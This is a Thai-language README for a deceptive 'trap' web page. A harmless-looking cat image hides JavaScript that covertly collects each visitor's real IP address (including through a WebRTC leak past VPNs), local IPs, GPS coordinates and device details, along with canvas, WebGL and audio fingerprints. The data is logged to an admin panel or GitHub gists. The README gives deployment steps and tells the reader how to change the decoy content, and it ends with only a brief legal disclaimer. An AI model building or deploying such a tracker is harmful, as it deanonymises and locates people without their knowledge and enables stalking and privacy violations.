# 🔍 Advanced IP Tracker with Fingerprinting

ระบบติดตาม IP และ Fingerprint ขั้นสูงที่รวม FingerprintJS v4, WebGL, Audio fingerprint และการตรวจจับพิกัดสำหรับความแม่นยำ 99.99%

## ✨ คุณสมบัติ

### 🌐 การติดตาม IP
- **Public IP จริง** - แม้ใช้ VPN ก็ตรวจจับได้
- **Local IP** - แสดง IP ภายในเครือข่าย (192.168.x.x, 10.x.x.x, 172.16-31.x.x)
- **WebRTC Leak Detection** - ใช้เทคนิค WebRTC เพื่อดึง IP จริง

### 📱 ข้อมูลอุปกรณ์
- **User-Agent เต็มรูปแบบ** - รุ่นมือถือ, OS, Browser
- **Hardware Information** - CPU cores, RAM, Touch support
- **Screen & Display** - ความละเอียดหน้าจอ, Pixel ratio, Color depth
- **Platform & Language** - แพลตฟอร์ม, ภาษา, Timezone

### 📍 พิกัดและตำแหน่ง
- **GPS Coordinates** - Latitude/Longitude ด้วยความแม่นยำสูง
- **Geolocation API** - ใช้ HTML5 Geolocation
- **GeoIP Lookup** - แสดงประเทศ, เมือง, ISP จาก IP

### 🔍 Fingerprinting ขั้นสูง
- **FingerprintJS v4** - Device fingerprinting แบบโปรเฟสชั่นแนล
- **Canvas Fingerprinting** - ตรวจจับการ render ของ Canvas
- **WebGL Fingerprinting** - ข้อมูล GPU และ WebGL renderer
- **Audio Fingerprinting** - ตรวจจับลักษณะเสียงของอุปกรณ์
- **Plugin Detection** - รายชื่อ plugins ที่ติดตั้ง
- **Battery Information** - สถานะแบตเตอรี่ (ถ้ามี)

### 📊 แดชบอร์ด Admin
- **Real-time Monitoring** - อัพเดทข้อมูลแบบเรียลไทม์
- **Visitor Analytics** - สถิติผู้เข้าชม
- **Data Export** - ส่งออกข้อมูลดิบ
- **Historical Tracking** - ติดตามประวัติการเข้าชม

## 🚀 การติดตั้งและใช้งาน

### สำหรับ Vercel (แนะนำ - Serverless)
```bash
# 1. ติดตั้ง Vercel CLI
npm install -g vercel

# 2. เข้าสู่ระบบ Vercel
vercel login

# 3. Deploy โปรเจค
vercel --prod

# หรือใช้ Vercel Dashboard
# 1. ไปที่ https://vercel.com
# 2. Import Git repository หรือ upload files
# 3. Deploy automatically
```

### สำหรับ Server แบบดั้งเดิม (PHP)
```bash
# ให้แน่ใจว่า PHP 7.4+ และ Apache/Nginx พร้อมใช้งาน
# ให้สิทธิ์เขียนโฟลเดอร์สำหรับเก็บข้อมูล
chmod 755 /path/to/your/project
```

### เข้าถึงระบบ
- **หน้า Trap**: `https://your-app.vercel.app/index.html`
- **Admin Panel**: `https://your-app.vercel.app/admin.html`
- **API Endpoints**: `https://your-app.vercel.app/api/*`

### การตั้งค่า Environment Variables
1. คัดลอกไฟล์ `.env.example` เป็น `.env`
2. แก้ไขค่าต่างๆ ใน `.env`:

```bash
# สำคัญ: แทนที่ด้วย GitHub token จริง
GITHUB_TOKEN=your_github_personal_access_token_here
GITHUB_USERNAME=your_github_username

# เลือกประเภทการเก็บข้อมูล
STORAGE_TYPE=github_gist  # หรือ localStorage
```

### การตั้งค่า GitHub Token
1. ไปที่ https://github.com/settings/tokens
2. สร้าง Personal Access Token ใหม่ (เลือก scope: `gist`)
3. แทนที่ `GITHUB_TOKEN` ใน `.env` ด้วย token จริง
4. แทนที่ `YOUR_GITHUB_TOKEN` ใน `index.html` ด้วย token จริง
5. ข้อมูลจะถูกบันทึกเป็น GitHub Gists แทน localStorage

## 📁 โครงสร้างไฟล์

```
IP-Tracker/
├── index.html          # หน้าแสดงรูปแมว + JavaScript tracking
├── admin.html          # แดชบอร์ด admin (static)
├── api/
│   └── index.js        # Vercel API สำหรับบันทึกข้อมูล
├── data/               # โฟลเดอร์ข้อมูล (สร้างอัตโนมัติ)
│   └── {visitor_id}/
│       ├── visits.json
│       ├── fingerprints.json
│       └── geo_{ip}.json
├── package.json        # Node.js dependencies
├── vercel.json         # Vercel deployment config
├── .env.example        # Environment variables template
├── leaks.txt           # Log สรุป
├── .gitignore          # Git ignore rules
└── README.md           # ไฟล์นี้
```

## 🔧 การปรับแต่ง

### เปลี่ยนหน้า Trap
แก้ไข `index.html` เพื่อเปลี่ยนเนื้อหาหลอก:
```html
<h1>เปลี่ยนข้อความตรงนี้</h1>
<img src="เปลี่ยนรูปภาพตรงนี้" alt="คำอธิบาย">
```

### ปรับแต่ง Fingerprinting
แก้ไขฟังก์ชันใน `index.html`:
```javascript
// เพิ่ม fingerprinting เพิ่มเติม
function customFingerprint() {
    // รหัสของคุณ
}
```

### ปรับแต่ง Admin Panel
แก้ไข `admin.php` เพื่อเพิ่มฟีเจอร์:
```php
// เพิ่มฟังก์ชัน admin ใหม่
function customAdminFeature() {
    // รหัสของคุณ
}
```

## 📊 ข้อมูลที่เก็บ

### ไฟล์ visits.json
```json
{
  "timestamp": "2024-01-01 12:00:00",
  "visitor_id": "abc123...",
  "fingerprint_confidence": 0.95,
  "user_agent": "Mozilla/5.0...",
  "platform": "Win32",
  "local_ips": ["192.168.1.100"],
  "public_ips": ["203.0.113.1"],
  "location": {
    "latitude": 13.7563,
    "longitude": 100.5018,
    "accuracy": 50
  }
}
```

### ไฟล์ fingerprints.json
```json
{
  "timestamp": "2024-01-01 12:00:00",
  "fingerprintjs_components": [...],
  "canvas_fingerprint": "data:image/png;base64,...",
  "webgl_fingerprint": {
    "renderer": "GeForce GTX 1060",
    "vendor": "NVIDIA Corporation"
  },
  "audio_fingerprint": "1a2b3c..."
}
```

## ⚠️ คำเตือนทางกฎหมาย

**โปรดใช้อย่างรับผิดชอบและถูกกฎหมายเท่านั้น**
- ตรวจสอบกฎหมาย PDPA/GDPR ในประเทศของคุณ
- ควรแจ้งผู้ใช้ก่อนเก็บข้อมูลส่วนบุคคล
- ใช้เพื่อการศึกษาและพัฒนาเท่านั้น

## 🔒 ความปลอดภัย

- ข้อมูลถูกเก็บในโฟลเดอร์ `data/` แยกตาม visitor_id
- ใช้ JSON format ที่มนุษย์อ่านได้
- ไม่มีการเข้ารหัสข้อมูล (เพิ่มได้ตามต้องการ)
- แนะนำให้ใช้ HTTPS เสมอ

## 🆘 การแก้ปัญหา

### ข้อมูลไม่แสดงใน Admin
1. ตรวจสอบสิทธิ์โฟลเดอร์ `data/`
2. ตรวจสอบ PHP error logs
3. ตรวจสอบ CORS headers

### Fingerprinting ไม่ทำงาน
1. ตรวจสอบ Console errors ใน browser
2. ตรวจสอบ Content Security Policy
3. ทดสอบบน HTTPS

### IP ไม่ถูกต้อง
1. WebRTC อาจถูกบล็อกโดย VPN
2. ลองใช้ STUN servers อื่น
3. ตรวจสอบ firewall settings

## 🤝 การมีส่วนร่วม

พบปัญหาหรือมีไอเดียปรับปรุง?
- สร้าง Issue ใน repository
- Fork และส่ง Pull Request
- แชร์ feedback ในการใช้งาน

## 📄 License

MIT License - ใช้ได้ฟรี แต่ต้องระบุเครดิต

---

**พัฒนาโดย**: IP-Tracker Team
**เวอร์ชัน**: 2.0 (Enhanced Fingerprinting)
**อัพเดทล่าสุด**: 2024
